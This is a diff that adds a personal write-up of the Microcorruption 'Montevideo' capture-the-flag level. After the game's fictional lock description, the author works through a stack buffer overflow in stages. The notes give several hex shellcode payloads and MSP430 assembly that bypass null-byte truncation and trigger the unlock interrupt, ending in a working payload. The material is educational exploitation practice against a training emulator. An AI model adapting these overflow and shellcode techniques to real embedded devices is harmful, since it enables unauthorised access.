@@ -1,0 +1,106 @@
+Montevideo
+
+	The LockIT Pro c.03  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 2 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
+    HSM will  directly send the  correct unlock message to  the LockIT
+    Pro Deadbolt  if the password  is correct, otherwise no  action is
+    taken.
+    
+    This is Hardware  Version C.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
+    connected to port 2.
+
+    This is Software Revision 03. We have received unconfirmed reports
+    of issues with the previous series of locks. We have reimplemented
+    much  of the  code according  to our  internal Secure  Development
+    Process.
+	
+I'm seeing yet another getsn. I'm going to check how much data I can write in.
+
+Okay, I've already figured out that I can give it more than 16 characters.
+
+It's going to return to whatever's at the stack pointer again. Let me overwrite that with the exact same code I used last time.
+
+30127f00b01232452153304161616161f22f was what I used for the last challenge. At that time, the input was being stored at 2ff2 at return time.
+
+I'm going to change the last two bytes to 43ee, because that's the new return address.
+
+30127f00b01232452153304161616161ee43
+
+That didn't work. There appears to be some kind of guard against a buffer overflow. It doesn't kick in if I give it passwordpasswordpasswordpassword, but it does with that hex encoded input.
+
+Oh, no, there isn't any guard, it just reads the null byte in 7f00 and stops the strcpy. I wonder what happens if I change it to 7f01?
+
+30127f01b01232452153304161616161ee43
+
+Whoops, forgot there's a call to int at one point. Let me adjust the address for that. 
+
+30127f01b0124c452153304161616161ee43
+
+Still doesn't work. What's going on here?
+
+Oh, so what's happening is INT sets the SR to 7f00 (the pushed thing) and calls interrupt.
+
+Okay, so let me put the wrong value in at first and use something to change it.
+
+There's a 3ffd at 4440. Sure, I'll use that. 0x1007f - 0x3ffd = 0xC082.
+
+3012 82c0 b0124c4521533041 6161 6161 ee43 - so now I have the value in there
+
+Wait, I need to add a raw value to it. Okay so the assembly instruction is going to be:
+add		#0x3ffd, &43f0
+
+Too many bytes. I'll try writing something from scratch.
+
+Interrupt for some reason requires SR to be a specific thing there so let's see if I can set this up manually.
+
+I went back and looked at Whitehorse. With the correct input, sr gets set to ff00 before the interrupt is called and it ends. I need to put ff00 in sr and call 0x10. I don't have to worry about 1000 because that call will be the last thing I do.
+
+mov #0xfeff, sr
+inc sr
+call #0x10
+
+3240fffe 1253 b0121000
+
+This doesn't work because setting sr to feff turned off the CPU. Let me try another thing.
+
+mov #0xfeff, r14
+inc r14
+mov r14, sr
+add #0x3344, &0x43fc
+call #0xcccc
+
+3e40fffe1e53024eb2504433fc43b012cccc
+
+That's barely too many bytes. Let me change it so that the last thing is ee43:
+
+3e40fffe1e53024eb2504433fc43b012ee43
+
+Now the addition won't line up, but if I change it so I add #0xbc12:
+mov #0xfeff, r14
+inc r14
+add #0xbc22, &0x43fe
+mov r14, sr
+call #0x43ee
+
+3e40fffe1e53b25022bcfe43024eb012ee43
+
+OH MY GOSH IT WORKED
